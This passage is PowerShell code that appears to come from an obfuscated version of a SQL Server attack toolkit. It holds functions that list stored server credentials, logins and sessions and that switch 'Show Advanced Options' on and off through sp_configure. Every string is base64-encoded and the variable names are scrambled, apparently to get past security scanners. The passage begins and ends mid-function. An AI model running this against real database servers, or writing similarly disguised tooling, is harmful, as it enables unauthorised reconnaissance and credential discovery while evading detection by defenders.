                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                    }
                }
                else
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABpAHMAIABkAGkAcwBhAGIAbABlAGQALgA=')))
                    }
                    if(${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                    {
                        if(-not $SuppressVerbose)
                        {
                            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAWQBvAHUAcgAgAGEAIABzAHkAcwBhAGQAbQBpAG4ALAAgAHQAcgB5AGkAbgBnACAAdABvACAAZQBuAGEAYgBsAGUAZAAgAGkAdAAuAA==')))
                        }
                        Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAxADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                        ${__/\____/\/\_/\/\} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | select -Property config_value -ExpandProperty config_value
                        if (${__/\____/\/\_/\/\} -eq 1)
                        {
                            ${_/\_/\/=\/\/=\/\_} = 1
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGUAZAAgAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzAC4A')))
                            }
                        }
                        else
                        {
                            if(-not $SuppressVerbose)
                            {
                                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARQBuAGEAYgBsAGkAbgBnACAAUwBoAG8AdwAgAEEAZAB2AGEAbgBjAGUAZAAgAE8AcAB0AGkAbwBuAHMAIABmAGEAaQBsAGUAZAAuACAAQQBiAG8AcgB0AGkAbgBnAC4A')))
                            }
                        }
                    }
                }
                Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUA'))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                % -Process {
                    ${___/===\/\_______} = $_.name
                    ${___/\/=====\_/===} = $_.minimum
                    ${_/\____/=\_/=\/\_} = $_.maximum
                    ${/===\___/\_____/\} = $_.config_value
                    ${/==\/\/===\__/\/=} = $_.run_value
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName, $Instance, ${___/===\/\_______}, ${___/\/=====\_/===}, ${_/\____/=\_/=\/\_}, ${/===\___/\_____/\}, ${/==\/\/===\__/\/=})
                }
                if(${_/\_/\/=\/\/=\/\_} -eq 1 -and ${__/\/==\____/\_/=} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA'))))
                {
                    if(-not $SuppressVerbose)
                    {
                        Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAARABpAHMAYQBiAGwAaQBuAGcAIABTAGgAbwB3ACAAQQBkAHYAYQBuAGMAZQBkACAATwBwAHQAaQBvAG4AcwA=')))
                    }
                    ${_/=\/==\__/\/=\/=} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBwAF8AYwBvAG4AZgBpAGcAdQByAGUAIAAnAFMAaABvAHcAIABBAGQAdgBhAG4AYwBlAGQAIABPAHAAdABpAG8AbgBzACcALAAwADsAUgBFAEMATwBOAEYASQBHAFUAUgBFAA=='))) -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
                }
                ${__/=\____/\__/==\}.Close()
                ${__/=\____/\__/==\}.Dispose()
            }
            catch
            {
                if(-not $SuppressVerbose)
                {
                    ${/=\_______/===\__} = $_.Exception.Message
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
                }
            }
        }
        ${____/\/=\_/\/===\} | Invoke-Parallel -ScriptBlock ${____/\__/\_/=\__/} -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue
        return ${/=\_____/\/\/=\__}
    }
}
Function  Get-SQLServerCredential
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Credential name.')]
        [string]$CredentialName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\__________/===} = New-Object -TypeName System.Data.DataTable
        if($CredentialName)
        {
            ${_/\_/\____/\/\/==} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABXAEgARQBSAEUAIABuAGEAbQBlACAAbABpAGsAZQAgACcAJABDAHIAZQBkAGUAbgB0AGkAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${_/\_/\____/\/\/==} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAbQBhAHMAdABlAHIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwByAGUAZABlAG4AdABpAGEAbABfAGkAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAYQBzACAAWwBDAHIAZQBkAGUAbgB0AGkAYQBsAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAHIAZQBkAGUAbgB0AGkAYQBsAF8AaQBkAGUAbgB0AGkAdAB5ACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMAcgBlAGEAdABlAF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABtAG8AZABpAGYAeQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABhAHIAZwBlAHQAXwB0AHkAcABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAYQByAGcAZQB0AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAWwBtAGEAcwB0AGUAcgBdAC4AWwBzAHkAcwBdAC4AWwBjAHIAZQBkAGUAbgB0AGkAYQBsAHMAXQANAAoAIAAgACAAIAAgACAAIAAgACQAewBfAC8AXABfAC8AXABfAF8AXwBfAC8AXAAvAFwALwA9AD0AfQA=')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\__________/===} = ${/=\__________/===} + ${/=\_____/\/\/=\__}
    }
    End
    {
        ${/=\__________/===}
    }
}
Function  Get-SQLServerLogin
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Principal name to filter for.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${____/=\_/=\_/\___} = New-Object -TypeName System.Data.DataTable
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAA=='))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAVAB5AHAAZQA='))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABhAHQAZQA='))))
        $null = ${____/=\_/=\_/\___}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEwAbwBjAGsAZQBkAA=='))))
        if($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAbQBhAHMAdABlAHIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALABwAHIAaQBuAGMAaQBwAGEAbABfAGkAZAAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbgBhAG0AZQAgAGEAcwAgAFsAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAaQBkACAAYQBzACAAWwBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAeQBwAGUAXwBkAGUAcwBjACAAYQBzACAAWwBQAHIAaQBuAGMAaQBwAGEAbABUAHkAcABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwByAGUAYQB0AGUAXwBkAGEAdABlACAAYQBzACAAWwBDAHIAZQBhAHQAZQBEAGEAdABlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATABPAEcASQBOAFAAUgBPAFAARQBSAFQAWQAgACgAIABuAGEAbQBlACAALAAgACcASQBzAEwAbwBjAGsAZQBkACcAIAApACAAYQBzACAAWwBJAHMATABvAGMAawBlAGQAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAcwB5AHMAXQAuAFsAcwBlAHIAdgBlAHIAXwBwAHIAaQBuAGMAaQBwAGEAbABzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAFIARQAgAHQAeQBwAGUAIAA9ACAAJwBTACcAIABvAHIAIAB0AHkAcABlACAAPQAgACcAVQAnACAAbwByACAAdAB5AHAAZQAgAD0AIAAnAEMAJwANAAoAIAAgACAAIAAgACAAIAAgACQAewBfAF8ALwA9AFwALwBcAC8APQA9AD0AXABfAF8ALwBcAC8AfQA=')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_____/\/\/=\__} |
        % -Process {
            ${/=\/======\___/=\} = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if (${/=\/======\___/=\}.length -le 10)
            {
                ${_/\/\/=\_/=\/\__/} = [Convert]::ToInt32(${/=\/======\___/=\},16)
            }
            else
            {
                ${_/\/\/=\_/=\/\__/} = ${/=\/======\___/=\}
            }
            $null = ${____/=\_/=\_/\___}.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                [string]$_.PrincipalId,
                [string]$_.PrincipalName,
                ${_/\/\/=\_/=\/\__/},
                [string]$_.PrincipalType,
                $_.CreateDate,
            [string]$_.IsLocked)
        }
    }
    End
    {
        ${____/=\_/=\_/\___}
    }
}
Function  Get-SQLSession
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'PrincipalName.')]
        [string]$PrincipalName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/=\_/\/\_/=\____} = New-Object -TypeName System.Data.DataTable
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAUwBpAGQA'))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA='))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwByAGkAZwBpAG4AYQBsAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUA'))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAGQA'))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBTAHQAYQByAHQAVABpAG0AZQA='))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBMAG8AZwBpAG4AVABpAG0AZQA='))))
        $null = ${_/=\_/\/\_/=\____}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBTAHQAYQB0AHUAcwA='))))
        if($PrincipalName)
        {
            ${__/=\/\/===\__/\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGwAbwBnAGkAbgBfAG4AYQBtAGUAIABsAGkAawBlACAAJwAkAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAJwA=')))
        }
        else
        {
            ${__/=\/\/===\__/\/} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFUAUwBFACAAbQBhAHMAdABlAHIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwBFAEwARQBDAFQAIAAgACcAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAnACAAYQBzACAAWwBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACcAJABJAG4AcwB0AGEAbgBjAGUAJwAgAGEAcwAgAFsASQBuAHMAdABhAG4AYwBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBlAGMAdQByAGkAdAB5AF8AaQBkACAAYQBzACAAWwBQAHIAaQBuAGMAaQBwAGEAbABTAGkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGwAbwBnAGkAbgBfAG4AYQBtAGUAIABhAHMAIABbAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABvAHIAaQBnAGkAbgBhAGwAXwBsAG8AZwBpAG4AXwBuAGEAbQBlACAAYQBzACAAWwBPAHIAaQBnAGkAbgBhAGwAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAZQBzAHMAaQBvAG4AXwBpAGQAIABhAHMAIABbAFMAZQBzAHMAaQBvAG4ASQBkAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbABhAHMAdABfAHIAZQBxAHUAZQBzAHQAXwBzAHQAYQByAHQAXwB0AGkAbQBlACAAYQBzACAAWwBTAGUAcwBzAGkAbwBuAFMAdABhAHIAdABUAGkAbQBlAF0ALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbABvAGcAaQBuAF8AdABpAG0AZQAgAGEAcwAgAFsAUwBlAHMAcwBpAG8AbgBMAG8AZwBpAG4AVABpAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAdQBzACAAYQBzACAAWwBTAGUAcwBzAGkAbwBuAFMAdABhAHQAdQBzAF0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEYAUgBPAE0AIAAgACAAIABbAHMAeQBzAF0ALgBbAGQAbQBfAGUAeABlAGMAXwBzAGUAcwBzAGkAbwBuAHMAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBSAEQARQBSACAAQgBZACAAcwB0AGEAdAB1AHMADQAKACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAC8APQBcAC8AXAAvAD0APQA9AFwAXwBfAC8AXAAvAH0A')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        ${/=\_____/\/\/=\__} |
        % -Process {
            ${/=\/======\___/=\} = [System.BitConverter]::ToString($_.PrincipalSid).Replace('-','')
            if (${/=\/======\___/=\}.length -le 10)
            {
                ${_/\/\/=\_/=\/\__/} = [Convert]::ToInt32(${/=\/======\___/=\},16)
            }
            else
            {
                ${_/\/\/=\_/=\/\__/} = ${/=\/======\___/=\}
            }
            $null = ${_/=\_/\/\_/=\____}.Rows.Add(
                [string]$_.ComputerName,
                [string]$_.Instance,
                ${_/\/\/=\_/=\/\__/},
                [string]$_.PrincipalName,
                [string]$_.OriginalPrincipalName,
                [string]$_.SessionId,
                [string]$_.SessionStartTime,
                [string]$_.SessionLoginTime,
            [string]$_.SessionStatus)
        }
    }
    End
    {
        ${_/=\_/\/\_/=\____}
    }
}
Function  Get-SQLOleDbProvder
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${/=\_____/\/\/=\__} = New-Object -TypeName System.Data.DataTable
        ${_/\/\/=\/\/\/\/=\} = New-Object -TypeName System.Data.DataTable
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAE4AYQBtAGUA')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAEQAZQBzAGMAcgBpAHAAdABpAG8AbgA='))))
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdgBpAGQAZQByAFAAYQByAHMAZQBOAGEAbQBlAA=='))))
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEkAbgBQAHIAbwBjAGUAcwBzAA=='))))
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEEAZABIAG8AYwBBAGMAYwBlAHMAcwA='))))
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBQAGEAcgBhAG0AZQB0AGUAcgBzAA==')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AEEAcwBBAGMAYwBlAHMAcwBQAGEAdABoAA==')))) 
        $null = ${_/\/\/=\/\/\/\/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAHYAZQBsAFoAZQByAG8ATwBuAGwAeQA=')))) 
